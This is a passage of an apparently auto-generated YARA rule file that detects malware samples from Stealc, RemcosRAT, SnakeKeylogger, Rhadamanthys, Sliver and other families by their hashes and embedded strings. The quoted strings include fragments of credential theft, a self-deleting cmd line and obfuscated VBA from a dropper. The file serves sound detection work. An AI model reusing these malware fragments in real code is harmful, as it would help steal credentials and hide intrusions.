      $s10 = "<GetCustomMethodInvokerIfNeeded" fullword ascii /* score: '13.00'*/
      $s11 = "<get_InternalRuntimeElementTypeNget_InternalRuntimeGenericTypeArguments@get_RuntimeGenericTypeParameters2get_SyntheticConstructo" ascii /* score: '12.00'*/
      $s12 = "6get_IsArrayOfReferenceTypes@TryLookupGenericMethodDictionary@" fullword ascii /* score: '12.00'*/
      $s13 = "<get_InternalRuntimeElementTypeNget_InternalRuntimeGenericTypeArguments@get_RuntimeGenericTypeParameters2get_SyntheticConstructo" ascii /* score: '12.00'*/
      $s14 = "\"get_DefaultBinder" fullword ascii /* score: '12.00'*/
      $s15 = "<GetNonRandomizedHashCodeOrdinalIgnoreCase>g__GetNonRandomizedHashCodeOrdinalIgnoreCaseSlow|46_0(GetSystemArrayEEType" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 20000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Stealc_signature__112f19f28f55f461c3d7ad7d3898dd7b_imphash__Stealc_signature__112f19f28f55f461c3d7ad7d3898dd7b_imphash__d0e_56 {
   meta:
      description = "_subset_batch - from files Stealc(signature)_112f19f28f55f461c3d7ad7d3898dd7b(imphash).exe, Stealc(signature)_112f19f28f55f461c3d7ad7d3898dd7b(imphash)_d0e31b51.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "900df9f41073a91a893f3d9ee81a9d18648e13238cb3ee176563bef0bbd699f8"
      hash2 = "d0e31b51c7d4acc0dc409886dc78bd8a416c475fe10adfe1521d200562380148"
   strings:
      $x1 = "C:\\Windows\\system32\\cmd.exe" fullword ascii /* score: '38.00'*/
      $s2 = "brave.exe" fullword wide /* score: '22.00'*/
      $s3 = "msedge.exe" fullword wide /* score: '22.00'*/
      $s4 = "/c timeout /t 5 & del /f /q \"" fullword ascii /* score: '15.00'*/
      $s5 = "endptr == token_buffer.data() + token_buffer.size()" fullword wide /* score: '15.00'*/
      $s6 = "C:\\builder_v2\\stealc\\json.h" fullword wide /* score: '13.00'*/
      $s7 = "\"app_bound_encrypted_key\":\"" fullword ascii /* score: '12.00'*/
      $s8 = "n_chars < number_buffer.size() - 1" fullword wide /* score: '12.00'*/
      $s9 = "last - first >= std::numeric_limits<FloatType>::max_digits10" fullword wide /* score: '12.00'*/
      $s10 = "last - first >= kMaxExp + 2" fullword wide /* score: '12.00'*/
      $s11 = "last - first >= 2 + (-kMinExp - 1) + std::numeric_limits<FloatType>::max_digits10" fullword wide /* score: '12.00'*/
      $s12 = "last - first >= std::numeric_limits<FloatType>::max_digits10 + 6" fullword wide /* score: '12.00'*/
      $s13 = "attempting to parse an empty input; check that your input string or stream contains the expected JSON" fullword ascii /* score: '11.00'*/
      $s14 = "C:\\ProgramData\\" fullword ascii /* score: '10.00'*/
      $s15 = "object key" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "112f19f28f55f461c3d7ad7d3898dd7b" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__55d8ae2d_SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c_57 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_55d8ae2d.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5868c11d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "55d8ae2d11aeb76c2214d735c46917541ac04febc6b2f8ac998d1173b838b5ce"
      hash2 = "5868c11dade3d2e362682b1c5922e58c2adf30297d4c35a9fbb446401510704e"
   strings:
      $s1 = "Overall: {0:F2}% ({1}) - GPA: {2:F2}" fullword wide /* score: '12.00'*/
      $s2 = "Overall: 0.00% (F) - GPA: 0.00" fullword wide /* score: '12.00'*/
      $s3 = "{0}: {1:F1}% ({2} items) - Weight: {3:P0}" fullword wide /* score: '12.00'*/
      $s4 = "Error exporting report: " fullword wide /* score: '10.00'*/
      $s5 = "GetAllGrades" fullword ascii /* score: '9.00'*/
      $s6 = "GetOverallLetterGrade" fullword ascii /* score: '9.00'*/
      $s7 = "GetGradeStatus" fullword ascii /* score: '9.00'*/
      $s8 = "GetGrade" fullword ascii /* score: '9.00'*/
      $s9 = "GetLetterGrade" fullword ascii /* score: '9.00'*/
      $s10 = "get_DateAssigned" fullword ascii /* score: '9.00'*/
      $s11 = "PercentageToLetterGrade" fullword ascii /* score: '9.00'*/
      $s12 = "get_AssignmentName" fullword ascii /* score: '9.00'*/
      $s13 = "PercentageToGPA" fullword ascii /* score: '9.00'*/
      $s14 = "GetOverallAverage" fullword ascii /* score: '9.00'*/
      $s15 = "GetWeightedPoints" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d_imphash__Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d__58 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32687360.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32cfff30.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_516d9dae.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_552543de.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_5840ea1c.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b4fd170f.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_dd620aed.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "03fe53eff294a718d3a887e23e2e83c98c55e8b6b5654bbc6650400f011604ad"
      hash2 = "32687360fdc4dad7137f1937bd995ca4591cb65f8ca607fa48d1a394cc4a824b"
      hash3 = "32cfff30d6ed1f3395b8ffbc8319fad8723f71547364a6cde2faddb2b80b5b1d"
      hash4 = "516d9daee48799c22090e64835e99df3d6a6384e9305bfa90287486c4e9881be"
      hash5 = "552543dea61279d3a283976db9ef74cb33d9ab66aba5ac3bb6203ffbcf141206"
      hash6 = "5840ea1c615a9daee7648736117ddce1c7c6e2143bf3b971e6828989e094edc4"
      hash7 = "b4fd170f2d56421678f4743cba758fb69779b4bfd0f77202dbfc760d8ed1c8e5"
      hash8 = "dd620aedd68431d93bf160121019e21774e7e4955f7be863486c5a699b1187c7"
   strings:
      $x1 = ".lib section in a.out corruptedbad write barrier buffer boundscall from within the Go runtimecannot assign requested addresscasg" ascii /* score: '51.00'*/
      $x2 = "stopTheWorld: not stopped (status != _Pgcstop)P has cached GC work at end of mark terminationattempting to link in too many shar" ascii /* score: '47.00'*/
      $x3 = "bad lfnode addressbad manualFreeListconnection refusedfile name too longforEachP: not donegarbage collectionidentifier removedin" ascii /* score: '46.00'*/
      $x4 = "GetAddrInfoWGetLastErrorGetLengthSidGetStdHandleGetTempPathWLoadLibraryWReadConsoleWSetEndOfFileTransmitFile_MSpanManualabi mism" ascii /* score: '44.00'*/
      $x5 = "unknown pcws2_32.dll  of size   (targetpc= gcwaiting= gp.status= heap_live= idleprocs= in status  m->mcache= mallocing= ms clock" ascii /* score: '43.00'*/
      $x6 = "object is remotepacer: H_m_prev=reflect mismatchremote I/O errorruntime:  g:  g=runtime: gp: gp=runtime: nelems=schedule: in cgo" ascii /* score: '43.00'*/
      $x7 = "address already in useadvapi32.dll not foundargument list too longassembly checks failedbad g->status in readycall not at safe p" ascii /* score: '39.00'*/
      $x8 = "file descriptor in bad statefindrunnable: netpoll with pgchelperstart: bad m->helpgcgcstopm: negative nmspinninginvalid runtime " ascii /* score: '38.00'*/
      $x9 = "ted waitm - semaphore out of syncs.allocCount != s.nelems && freeIndex == s.nelemsattempt to execute system stack code on user s" ascii /* score: '35.00'*/
      $x10 = "bad map stateexchange fullfatal error: gethostbynamegetservbynamekernel32.dll" fullword ascii /* score: '33.00'*/
      $x11 = " MB) workers= called from  gcscanvalid  heap_marked= idlethreads= is nil, not  s.spanclass= span.base()= syscalltick= work.nproc" ascii /* score: '32.00'*/
      $x12 = "atchadvapi32.dllbad g statusbad g0 stackbad recoverycan't happencas64 failedchan receivedumping heapend tracegc" fullword ascii /* score: '32.00'*/
      $s13 = "rkrootruntime: VirtualQuery failed; errno=runtime: bad notifyList size - sync=runtime: invalid pc-encoded table f=runtime: inval" ascii /* score: '30.00'*/
      $s14 = "chemswsock.dllscheddetailsecur32.dllshell32.dlltracealloc(unreachableuserenv.dll [recovered] allocCount  found at *( gcscandone " ascii /* score: '30.00'*/
      $s15 = "p->atomicstatus=CreateSymbolicLinkWCryptReleaseContextGetCurrentProcessIdGetTokenInformationMSpan_Sweep: state=WaitForSingleObje" ascii /* score: '28.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and pe.imphash() == "a520fd20530cf0b0db6a6c3c8b88d11d" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__Rhadamanthys_signature__7c513b4a_59 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature).hta, Rhadamanthys(signature)_7c513b4a.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c4957b3e8d09615172703a9349dcd8c88271ad3f1449154b188cb579a830ba71"
      hash2 = "7c513b4a91a01e467c917065004749df6247c61e8238ef744bbdaec1273ff552"
   strings:
      $s1 = "        tempoString = tempoString & \"B.Rec\"" fullword ascii /* score: '14.00'*/
      $s2 = "Private Sub SetVBOMKey(xlVersion , newValue )" fullword ascii /* score: '13.00'*/
      $s3 = "    ' Various methods here: https://www.motobit.com/tips/detpg_binarytostring/" fullword ascii /* score: '12.00'*/
      $s4 = "        Dim tempoString " fullword ascii /* score: '11.00'*/
      $s5 = "        tempoString = \"ADOD\"" fullword ascii /* score: '11.00'*/
      $s6 = "        tempoString = tempoString & \"ordset\"" fullword ascii /* score: '11.00'*/
      $s7 = "        Set recordSet = CreateObject(tempoString)" fullword ascii /* score: '11.00'*/
      $s8 = "Function getMacroStr27() " fullword ascii /* score: '9.00'*/
      $s9 = "Function getMacroStr19() " fullword ascii /* score: '9.00'*/
      $s10 = "Function getMacroStr5() " fullword ascii /* score: '9.00'*/
      $s11 = "Function getMacroStr23() " fullword ascii /* score: '9.00'*/
      $s12 = "Function getMacroStr9() " fullword ascii /* score: '9.00'*/
      $s13 = "Function getMacroStr21() " fullword ascii /* score: '9.00'*/
      $s14 = "Function getMacroStrTotal()  " fullword ascii /* score: '9.00'*/
      $s15 = "Function getMacroStr7() " fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x0a0d and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__d9d3dc366861974d56e9cfc24758d032_imphash__SnakeKeylogger_signature__e1286f2989f2b70b354fe5e33036a_60 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe, SnakeKeylogger(signature)_e1286f2989f2b70b354fe5e33036a7bb(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
      hash2 = "e1eb24ee7b92716ab4ca09309e4dc4ce5470f832145d00f18a2eda2dcd595384"
   strings:
      $s1 = "MpGetConfigPayloadStatus" fullword ascii /* score: '21.00'*/
      $s2 = "MpGetThreatExecutionInfo" fullword ascii /* score: '21.00'*/
      $s3 = "MpGetCopyAcceleratorProcessStatus" fullword ascii /* score: '20.00'*/
      $s4 = "MpGetAsrBlockedProcesses" fullword ascii /* score: '20.00'*/
      $s5 = "MpImportConfigPayload" fullword ascii /* score: '19.00'*/
      $s6 = "MpElevationHandleAcquire" fullword ascii /* score: '16.00'*/
      $s7 = "MpElevationHandleOpen" fullword ascii /* score: '16.00'*/
      $s8 = "MpElevationHandleActivate" fullword ascii /* score: '16.00'*/
      $s9 = "MpSetUacElevationDefaultWindowHandle" fullword ascii /* score: '16.00'*/
      $s10 = "MpElevationHandleAttach" fullword ascii /* score: '16.00'*/
      $s11 = "MpShutdownCopyAcceleratorProcess" fullword ascii /* score: '15.00'*/
      $s12 = "MpConveyDlpBypass" fullword ascii /* score: '15.00'*/
      $s13 = "MpDlpGetOperationEnforcmentMode" fullword ascii /* score: '14.00'*/
      $s14 = "MpGetEngineVersion" fullword ascii /* score: '12.00'*/
      $s15 = "MpGetRunningMode" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__57b8d1f1_SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c_61 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_57b8d1f1.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_04db5280.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d04cf401.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "57b8d1f1afc63450aff6f6c4a3ac9af5c7f7e1ea8de0187987df2ce051cd2ea5"
      hash2 = "04db52801a029ba84f762b0a3b67266db401976423b729bf13008de64758ab4b"
      hash3 = "d04cf401daa99d9633590e81aa8b4985b7de8193394d1422088ecd68ed933d2a"
   strings:
      $s1 = "john.doe@email.com" fullword wide /* score: '21.00'*/
      $s2 = "jane.smith@email.com" fullword wide /* score: '21.00'*/
      $s3 = "Contact Details - " fullword wide /* score: '12.00'*/
      $s4 = "contacts.xml" fullword wide /* score: '10.00'*/
      $s5 = "First Name,Last Name,Phone,Email,Company,Job Title,Address,Notes" fullword wide /* score: '10.00'*/
      $s6 = "GetAllContacts" fullword ascii /* score: '9.00'*/
      $s7 = "<GetContactById>b__0" fullword ascii /* score: '9.00'*/
      $s8 = "GetContactCount" fullword ascii /* score: '9.00'*/
      $s9 = "<GetAllContacts>b__3_1" fullword ascii /* score: '9.00'*/
      $s10 = "<GetRecentContacts>b__10_0" fullword ascii /* score: '9.00'*/
      $s11 = "GetRecentContacts" fullword ascii /* score: '9.00'*/
      $s12 = "<GetAllContacts>b__3_0" fullword ascii /* score: '9.00'*/
      $s13 = "GetContactById" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__c7269d59926fa4252270f407e4dab043__62 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash3 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash4 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
   strings:
      $s1 = "y failed; errno=runtime: bad notifyList size - sync=runtime: invalid pc-encoded table f=runtime: invalid typeBitsBulkBarrierrunt" ascii /* score: '30.00'*/
      $s2 = "entifier removedindex out of rangeinput/output errormultihop attemptedno child processesno locks availableoperation canceledrunt" ascii /* score: '26.00'*/
      $s3 = "level 3 resetload64 failedmin too largenil stackbaseout of memorypowrprof.dll" fullword ascii /* score: '23.00'*/
      $s4 = "ems && freeIndex == s.nelemsslice bounds out of range [::%x] with capacity %yattempt to execute system stack code on user stackc" ascii /* score: '23.00'*/
      $s5 = "WriteProcessMemorybad manualFreeListconnection refusedfaketimeState.lockfile name too longforEachP: not donegarbage collectionid" ascii /* score: '20.00'*/
      $s6 = "characterpanicwrap: unexpected string after package name: runtime: unexpected waitm - semaphore out of syncs.allocCount != s.nel" ascii /* score: '18.00'*/
      $s7 = "e to parking on channelruntime: CreateIoCompletionPort failed (errno= slice bounds out of range [::%x] with length %yCreateWaita" ascii /* score: '16.00'*/
      $s8 = "ization - linker skewruntime: unable to acquire - semaphore out of syncGC must be disabled to protect validity of fn valuefatal:" ascii /* score: '15.00'*/
      $s9 = "runtime.headTailIndex.tail" fullword ascii /* score: '15.00'*/
      $s10 = " systemstack called from unexpected goroutinepotentially overlapping in-use allocations detectedruntime: netpoll: PostQueuedComp" ascii /* score: '14.00'*/
      $s11 = "entersyscallgcBitsArenasgcpacertracehost is downillegal seekinvalid slotiphlpapi.dllkernel32.dllmadvdontneedmheapSpecialmspanSpe" ascii /* score: '14.00'*/
      $s12 = "y unfreed span set block found in resetinvalid memory address or nil pointer dereferenceinvalid or incomplete multibyte or wide " ascii /* score: '12.00'*/
      $s13 = "bleTimerEx when creating timer failedcould not find GetSystemTimeAsFileTime() syscallruntime.preemptM: duplicatehandle failed; e" ascii /* score: '11.00'*/
      $s14 = "sync/atomic.CompareAndSwapInt32.args_stackmap" fullword ascii /* score: '11.00'*/
      $s15 = "sync/atomic.CompareAndSwapInt32" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__96a0774f_RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_63 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_96a0774f.exe, RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f864db9e.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_593b2dd3.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a978e9f0.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e69f506f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "96a0774fc25c036056be449766e6829678457f642381dbbd99525f4866e55f70"
      hash2 = "f864db9e41e3faf0761362b0dcc7c8b5eae9786340ff56effdea61f9af31c006"
      hash3 = "593b2dd3e7a1806f5f97341c297792834c28f57fb95e33c4528c733a9fed4c73"
      hash4 = "a978e9f0e7652cd9c2ce9ea041da1d462ff15cf1fc941c643cec42759205b99b"
      hash5 = "e69f506fb5549fac407a4e5e7c3400e73adfe40329a262771d7bae9a5ab1ba17"
   strings:
      $s1 = "frmLogin" fullword ascii /* score: '15.00'*/
      $s2 = "Login_And_Register_Form" fullword ascii /* score: '15.00'*/
      $s3 = "Login_And_Register_Form.registerForm.resources" fullword ascii /* score: '15.00'*/
      $s4 = "Login_And_Register_Form.Properties.Resources.resources" fullword ascii /* score: '15.00'*/
      $s5 = "Login_And_Register_Form.Properties" fullword ascii /* score: '15.00'*/
      $s6 = "Login_And_Register_Form.frmLogin.resources" fullword ascii /* score: '15.00'*/
      $s7 = "chckbxPassword" fullword ascii /* score: '12.00'*/
      $s8 = "chckbxPassword_CheckedChanged" fullword ascii /* score: '12.00'*/
      $s9 = "3336333$333" fullword ascii /* score: '9.00'*/ /* hex encoded string '36333' */
      $s10 = "PrecisionSoft Technologies" fullword wide /* score: '9.00'*/
      $s11 = "PrecisionSoft Technologies 2025" fullword wide /* score: '9.00'*/
      $s12 = "btnfive" fullword ascii /* score: '8.00'*/
      $s13 = "btnmultiply" fullword ascii /* score: '8.00'*/
      $s14 = "btnthree" fullword ascii /* score: '8.00'*/
      $s15 = "btneight" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d__64 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32cfff30.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b7b7d002.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_c3f26585.exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "32cfff30d6ed1f3395b8ffbc8319fad8723f71547364a6cde2faddb2b80b5b1d"
      hash3 = "b7b7d00276073da29572e3dee367869d603ec7f64080a8bf99a8226ece840375"
      hash4 = "c3f26585fd9cf218077198e642eabb9a8468f092d8a9138b43e7f68c832df64a"
      hash5 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash6 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash7 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash8 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
      hash9 = "faed38b89c09070971844291bfefe437592451789e389ab38e3396ff84e49159"
      hash10 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "runtime.processorVersionInfo" fullword ascii /* score: '21.00'*/
      $s2 = "runtime.mutexprofilerate" fullword ascii /* score: '21.00'*/
      $s3 = "runtime.execLock" fullword ascii /* score: '19.00'*/
      $s4 = "runtime.printBacklogIndex" fullword ascii /* score: '18.00'*/
      $s5 = "runtime.hashkey" fullword ascii /* score: '16.00'*/
      $s6 = "runtime.sweep" fullword ascii /* score: '15.00'*/
      $s7 = "runtime.printBacklog" fullword ascii /* score: '15.00'*/
      $s8 = "runtime.fastlog2Table" fullword ascii /* score: '15.00'*/
      $s9 = "runtime.faketime" fullword ascii /* score: '15.00'*/
      $s10 = "runtime.data" fullword ascii /* score: '14.00'*/
      $s11 = "runtime.end" fullword ascii /* score: '13.00'*/
      $s12 = "runtime.aeskeysched" fullword ascii /* score: '13.00'*/
      $s13 = "runtime.sig" fullword ascii /* score: '13.00'*/
      $s14 = "runtime.buckhash" fullword ascii /* score: '13.00'*/
      $s15 = "runtime.buildVersion" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Sliver_signature__c2d457ad8ac36fc9f18d45bffcd450c2_imphash__SparkRAT_signature__9cbefe68f395e67356e2a5d8d1b285c0_imphash__S_65 {
   meta:
      description = "_subset_batch - from files Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash2 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash3 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash4 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "runtime.mapiternext" fullword ascii /* score: '10.00'*/
      $s2 = "strconv.baseError" fullword ascii /* score: '10.00'*/
      $s3 = "reflect.cvtRunesString" fullword ascii /* score: '10.00'*/
      $s4 = "compress/flate.(*byLiteral).Len" fullword ascii /* score: '10.00'*/
      $s5 = "strconv.bitSizeError" fullword ascii /* score: '10.00'*/
      $s6 = "compress/flate.byLiteral.Len" fullword ascii /* score: '10.00'*/
      $s7 = "reflect.New" fullword ascii /* score: '10.00'*/
      $s8 = "reflect.Value.runes" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.FuncForPC" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.mapaccessK" fullword ascii /* score: '10.00'*/
      $s11 = "strconv.rangeError" fullword ascii /* score: '10.00'*/
      $s12 = "reflect.Value.setRunes" fullword ascii /* score: '10.00'*/
      $s13 = "compress/flate.(*hcode).set" fullword ascii /* score: '10.00'*/
      $s14 = "reflect.cvtStringRunes" fullword ascii /* score: '10.00'*/
      $s15 = "reflect.makeRunes" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 25000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__c7269d59926fa4252270f407e4dab043__66 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash3 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash4 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash5 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash6 = "faed38b89c09070971844291bfefe437592451789e389ab38e3396ff84e49159"
      hash7 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "os.Executable" fullword ascii /* score: '20.00'*/
      $s2 = "os.executable" fullword ascii /* score: '16.00'*/
      $s3 = "internal/poll.execIO" fullword ascii /* score: '16.00'*/
      $s4 = "os.commandLineToArgv" fullword ascii /* score: '16.00'*/
      $s5 = "internal/poll.(*fdMutex).increfAndClose" fullword ascii /* score: '15.00'*/
      $s6 = "internal/poll.(*fdMutex).decref" fullword ascii /* score: '15.00'*/
      $s7 = "internal/poll.(*fdMutex).rwlock" fullword ascii /* score: '15.00'*/
      $s8 = "internal/poll.(*fdMutex).rwunlock" fullword ascii /* score: '15.00'*/
      $s9 = "*poll.fdMutex" fullword ascii /* score: '15.00'*/
      $s10 = "runtime.netpollblockcommit" fullword ascii /* score: '13.00'*/
      $s11 = "syscall.GetCommandLine" fullword ascii /* score: '11.00'*/
      $s12 = "readbyte" fullword ascii /* score: '11.00'*/
      $s13 = "runtime.createfing" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.SetFinalizer.func1" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.netpollcheckerr" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__d52658fa_SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c_67 {
   meta:
